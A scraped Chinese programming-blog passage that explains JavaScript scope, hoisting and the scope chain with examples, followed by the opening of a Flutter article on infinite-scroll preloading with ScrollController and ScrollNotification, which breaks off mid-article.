100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>引言：在新手学JS最易懵的3个点——作用域、闭包、原型，其中作用域是基础</p>
<h2 data-id="heading-0">一、什么是 JS 作用域</h2>
<p>大白话：作用域就是“变量/函数的可用范围”——哪里能访问，哪里不能访问，由它的“出生地”决定</p>
<p>其中，可分为三大作用域（全局作用域，函数作用域，块级作用域）</p>
<h3 data-id="heading-1">1.全局作用域</h3>
<p>顾名思义，该作用域作用于全局，在该作用域声明的变量能在任何地方被访问</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">var</span> a = <span class="hljs-number">100</span>

<span class="hljs-keyword">if</span>(<span class="hljs-literal">true</span>){
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a) <span class="hljs-comment">// 100</span>
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"/>){
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a)
}
<span class="hljs-title function_">foo</span>() <span class="hljs-comment">// 100</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a) <span class="hljs-comment">// 100</span>
</code></pre>
<p>由此可见 ： 在全局作用域声明的变量，在语句（例如 if ）， 函数， 全局内均能访问到。</p>
<h3 data-id="heading-2">2. 函数作用域</h3>
<p>该作用域作用于函数内部，仅在函数内部生效，函数的形参也包含在函数作用域内部</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"/>){
  <span class="hljs-keyword">var</span> a = <span class="hljs-number">100</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a)
}

<span class="hljs-title function_">foo</span>() <span class="hljs-comment">// 100</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a) <span class="hljs-comment">// 未定义</span>
</code></pre>
<p>由此可见，定义在函数内部的变量无法在函数作用域外访问到</p>
<h3 data-id="heading-3">3.块级作用域</h3>
<p>块级作用域 (let,const 和  { } 语法配合使用会导致声明的变量处在一个作用域中)</p>
<pre><code class="hljs language-js" lang="js">{
  <span class="hljs-keyword">var</span> a = <span class="hljs-number">100</span>
}
{
  <span class="hljs-keyword">let</span> b = <span class="hljs-number">200</span>
}
{
  <span class="hljs-keyword">const</span> c = <span class="hljs-number">300</span>
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a) <span class="hljs-comment">// 100</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(b) <span class="hljs-comment">// 未定义</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(c) <span class="hljs-comment">// 未定义</span>
</code></pre>
<p>如上述代码所示，在被{ } 包裹 var 声明的 a 还是能在全局访问到， 而 let / const 声明的变量则不能被全局访问到，这是因为他们形成了自己的块级作用域</p>
<hr/>
<h2 data-id="heading-4">作用域的核心规则</h2>
<h3 data-id="heading-5">1.变量提升（var的“坑”，let/const的优化）</h3>
<p>先来谈谈何为变量提升</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">var</span> a = <span class="hljs-number">100</span> 
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a) <span class="hljs-comment">// 100</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(b) <span class="hljs-comment">// undefined</span>
<span class="hljs-keyword">var</span> b = <span class="hljs-number">200</span>

</code></pre>
<p>由 var 定义的变量会存在变量提升的现象，就好像头和身子分离了，a 的例子看不出来， b 就豁然开朗了，
一般别的语言这个时候就已经开始报错了，但是 JS 的 var 不一样，它特殊，在 V8 引擎里它长这样</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">var</span> a = <span class="hljs-number">100</span> 
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a) <span class="hljs-comment">// 100</span>

<span class="hljs-keyword">var</span> b
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(b) <span class="hljs-comment">// undefined</span>
b = <span class="hljs-number">200</span>
</code></pre>
<p>可以看到 b 的声明跑到前面去了，这种现象我们称之为变量提升</p>
<p>又如</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 全局作用域</span>
{
  <span class="hljs-keyword">var</span> a = <span class="hljs-number">1</span>; <span class="hljs-comment">// var 声明的变量，穿透 {}，属于外层（全局）作用域</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a); <span class="hljs-comment">// 1</span>
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a); <span class="hljs-comment">// 1  能访问到，说明 {} 没形成独立作用域</span>

<span class="hljs-comment">// 函数作用域（对比）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">var</span> b = <span class="hljs-number">2</span>; <span class="hljs-comment">// 函数作用域内的变量，外层访问不到</span>
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(b); <span class="hljs-comment">// 报错：b is not defined（函数作用域生效）</span>
</code></pre>
<p>这种反人类直觉的东西不应该存在，所以 JS 后续推出了 let/const 的优化</p>
<pre><code class="hljs language-js" lang="js">
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(c) <span class="hljs-comment">// 未定义</span>
<span class="hljs-keyword">let</span> c = <span class="hljs-number">100</span> 


<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(d) <span class="hljs-comment">// 未定义</span>
<span class="hljs-keyword">const</span> d = <span class="hljs-number">300</span>
</code></pre>
<p>这样才符合直觉</p>
<h3 data-id="heading-6">2.作用域链（变量查找的规则）</h3>
<p>作用域的查找规则就像是剥洋葱，一层一层往外层找，直到全局作用域，找不到就报错</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 全局作用域</span>
<span class="hljs-keyword">let</span> all = <span class="hljs-string">"全局变量"</span>;
<span class="hljs-comment">// 外层函数作用域</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">outerFn</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">let</span> outer = <span class="hljs-string">"外层变量"</span>;
  <span class="hljs-comment">// 内层函数作用域</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">innerFn</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">let</span> inner = <span class="hljs-string">"内层变量"</span>;
    <span class="hljs-comment">// 查找顺序：inner（当前内层作用域） outer（外层作用域） global（全局作用域）</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(inner); <span class="hljs-comment">// 输出：内层变量（当前作用域找到）</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(outer); <span class="hljs-comment">// 输出：外层变量（当前找不到，去外层找）</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(all); <span class="hljs-comment">// 输出：全局变量（内层、外层都找不到，去全局找）   </span>
    <span class="hljs-comment">// 注释打开会报错（全局也找不到）</span>
  }
  <span class="hljs-title function_">innerFn</span>();
}
<span class="hljs-title function_">outerFn</span>();
</code></pre>
<h3 data-id="heading-7">3. if/for 不是对象，也没有“作用域”</h3>
<p>这里的意思是 if/for 不会像上述的全局，函数拥有自己独特的作用域</p>
<pre><code class="hljs language-js" lang="js">   {
  <span class="hljs-keyword">let</span> c = <span class="hljs-number">3</span>; <span class="hljs-comment">// let 声明，被 {} 的块级作用域包裹</span>
  <span class="hljs-keyword">const</span> d = <span class="hljs-number">4</span>; <span class="hljs-comment">// const 同理</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(c); <span class="hljs-comment">// 3</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(d); <span class="hljs-comment">// 4</span>
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(c); <span class="hljs-comment">//  报错：c is not defined（块级作用域隔离）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(d); <span class="hljs-comment">//  报错：d is not defined</span>

<span class="hljs-comment">// 经典例子：for 循环的块级作用域</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) {
  <span class="hljs-comment">// 每次循环都会创建一个独立的块级作用域，i 只在当前循环生效</span>
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i), <span class="hljs-number">0</span>); <span class="hljs-comment">// 输出 0、1、2 </span>
}

<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">3</span>; j++) {
  <span class="hljs-comment">// var 无块级作用域，j 是全局的，循环结束后 j=3</span>
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(j), <span class="hljs-number">0</span>); <span class="hljs-comment">// 输出 3、3、3 </span>
}
</code></pre>
<p>就像上述代码所展示，var 声明的变量还是跑到全局了，所以输出的都是 3 ，
当然这里还涉及到了定时器的异步，后续文章也会的对异步展开讨论</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[干掉 Loading 转圈：在 Flutter 中实现真正的“无感”分页]]></title>    <link>https://juejin.cn/post/7602965400809930802</link>    <guid>https://juejin.cn/post/7602965400809930802</guid>    <pubDate>2026-02-05T13:49:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602965400809930802" data-draft-id="7602965400809898034" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="干掉 Loading 转圈：在 Flutter 中实现真正的“无感”分页"/> <meta itemprop="keywords" content="Flutter"/> <meta itemprop="datePublished" content="2026-02-05T13:49:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="擅长在代码中下毒"/> <meta itemprop="url" content="https://juejin.cn/user/3228605945228429"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            干掉 Loading 转圈：在 Flutter 中实现真正的“无感”分页
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3228605945228429/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    擅长在代码中下毒
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T13:49:25.000Z" title="Thu Feb 05 2026 13:49:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>想象一下，你的用户正在沉浸式地刷着信息流，内容精彩纷呈，多巴胺正在分泌，突然——<em>咣当</em>——他们触底了。一个灰色的圈在转动。魔法中断了，体验“出戏”了。</p>
<p>在高质量的 App 中，“无限滚动（Infinite Scroll）”不应该仅仅在逻辑上是无限的，它在<strong>体验上</strong>也应该是无限的。我们不应该等用户撞了南墙才回头，我们应该预判他们的行为。</p>
<p>今天，我们要干掉那个加载圈。我们将探讨 Flutter 中列表预加载的演进之路：从手动实现的“苦力法”，到生产环境可用的 <strong>“低侵入”</strong> 方案。</p>
<p><em>（🐶 我承认有些圈的确能够让人赏心悦目）</em>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7fa884f08fbf442e8b8eed3d7e11967d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pOF6ZW_5Zyo5Luj56CB5Lit5LiL5q-S:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770904169&amp;x-signature=88gNaFRUvWk2TP3uugPhgKAfNtE%3D" alt="15ee8c1cc19a457289632f485ecc6d73.webp" loading="lazy"/></p>
<h2 data-id="heading-0">1. 经典方案：<code>ScrollController</code></h2>
<p>检测用户是否接近底部的最直观方法，就是去问 <code>ScrollController</code>。</p>
<h3 data-id="heading-1">1.1 原始实现（样板代码）</h3>
<p>核心逻辑就是简单的数学计算。监听滚动偏移量，如果 <code>当前位置 + 阈值 &gt;= 总长度</code>，就触发加载。</p>
<p>标准代码如下所示。它能跑，但它让你的 Widget 变得乱糟糟：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyFeedPage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _MyFeedPageState createState() =&gt; _MyFeedPageState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_MyFeedPageState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">MyFeedPage</span>&gt; </span>{
  <span class="hljs-keyword">final</span> ScrollController _controller = ScrollController();

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    _controller.addListener(() {
      <span class="hljs-comment">// 1. 检查是否触底（预留 600px 的缓冲空间）</span>
      <span class="hljs-keyword">if</span> (_controller.position.pixels &gt;= 
          _controller.position.maxScrollExtent - <span class="hljs-number">600</span>) {
        
        <span class="hljs-comment">// 2. 调用加载数据的逻辑</span>
        _loadMoreData(); 
      }
    });
  }

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> dispose() {
    _controller.dispose(); <span class="hljs-comment">// 别忘了销毁！</span>
    <span class="hljs-keyword">super</span>.dispose();
  }

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> ListView.builder(
      controller: _controller, <span class="hljs-comment">// 你必须手动绑定它</span>
      itemBuilder: (ctx, i) =&gt; ListTile(title: Text(<span class="hljs-string">"Item <span class="hljs-subst">$i</span>"</span>)),
    );
  }
}
</code></pre>
<h3 data-id="heading-2">1.2 重构：使用 Mixin 解耦</h3>
<p>上面的代码有什么问题？<strong>重复。</strong> 如果你有 10 个列表页面，你就得把这套逻辑写 10 遍。</p>
<p>我们可以将其提取到一个 <strong>Mixin</strong> 中。这样不仅保持了 UI 代码的整洁，还能让任何 <code>StatefulWidget</code> 瞬间获得“分页能力”。</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">mixin</span> PaginationMixin&lt;T <span class="hljs-keyword">extends</span> StatefulWidget&gt; <span class="hljs-keyword">on</span> State&lt;T&gt; {
  <span class="hljs-keyword">final</span> ScrollController scrollController = ScrollController();
  
  <span class="hljs-keyword">void</span> _onScroll() {
    <span class="hljs-comment">// 在这里统一管理阈值逻辑（例如：600px）</span>
    <span class="hljs-keyword">if</span> (scrollController.position.extentAfter &lt; <span class="hljs-number">600</span>) {
      onLoadMore();
    }
  }

  <span class="hljs-comment">// 强制使用该 Mixin 的类实现具体的加载逻辑</span>
  <span class="hljs-keyword">void</span> onLoadMore(); 
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    scrollController.addListener(_onScroll);
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> dispose() {
    scrollController.dispose();
    <span class="hljs-keyword">super</span>.dispose();
  }
}
</code></pre>
<p>现在好多了。但这仍然强迫你的 UI 去持有并绑定一个 <code>ScrollController</code>。如果你是在一个嵌套视图中，很难直接控制 Controller 怎么办？</p>
<h2 data-id="heading-3">2. 纯粹方案：<code>ScrollNotification</code></h2>
<p>Flutter 提供了一个冒泡事件系统，叫做 <code>ScrollNotification</code>。这允许我们在不管理 Controller 实例的情况下监听滚动事件。</p>
<h3 data-id="heading-4">2.1 原始实现</h3>
<p>我们可以用 <code>NotificationListener</code> 包裹列表：</p>
<pre><code class="hljs language-dart" lang="dart">NotificationListener&lt;ScrollNotification&gt;(
  onNotification: (notification) {
    <span class="hljs-comment">// 筛选滚动更新事件</span>
    <span class="hljs-keyword">if</span> (notification <span class="hljs-keyword">is</span> ScrollUpdateNotification) {
      <span class="hljs-comment">// 检查剩余距离（保持一致的 600px 阈值）</span>
      <span class="hljs-keyword">if</span> (notification.metrics.extentAfter &lt; <span class="hljs-number">600</span>) {
        _preloadNextPage();
      }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>; <span class="hljs-comment">// 让通知继续向上冒泡</span>
  },
  child: ListView.builder(...),
)
</code></pre>
<h3 data-id="heading-5">2.2 重构：组件封装</h3>
<p>虽然这种方式很灵活，但把逻辑写在 <code>build</code> 方法里违反了整洁架构原则。它把**布局（Layout）<strong>和</strong>业务逻辑（Business Logic）**混在一起了。</p>
<p>让我们把它封装成一个专用的 <strong>PreloadDetector</strong> 组件：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PreloadDetector</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">final</span> Widget child;
  <span class="hljs-keyword">final</span> VoidCallback onTrigger;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">double</span> threshold;

  <span class="hljs-keyword">const</span> PreloadDetector({
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.child, 
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.onTrigger,
    <span class="hljs-keyword">this</span>.threshold = <span class="hljs-number">600</span>, <span class="hljs-comment">// 默认为 600px</span>
  });

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> NotificationListener&lt;ScrollNotification&gt;(
      onNotification: (notification) {
        <span class="hljs-keyword">if</span> (notification.metrics.extentAfter &lt; threshold) {
          onTrigger();
        }
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
      },
      child: child,
    );
  }
}
</code></pre>
<p>很干净。但是，你依然需要手动处理 <strong>状态防卫（State Guarding）</strong> （例如：“如果正在加载中则不触发”或者“如果没数据了则不触发”）。</p>
<h2 data-id="heading-6">3. “低侵入”方案：<code>scroll_preload_detector</code></h2>
<p>不像上述两种方法都需要你手动维护状态逻辑。</p>
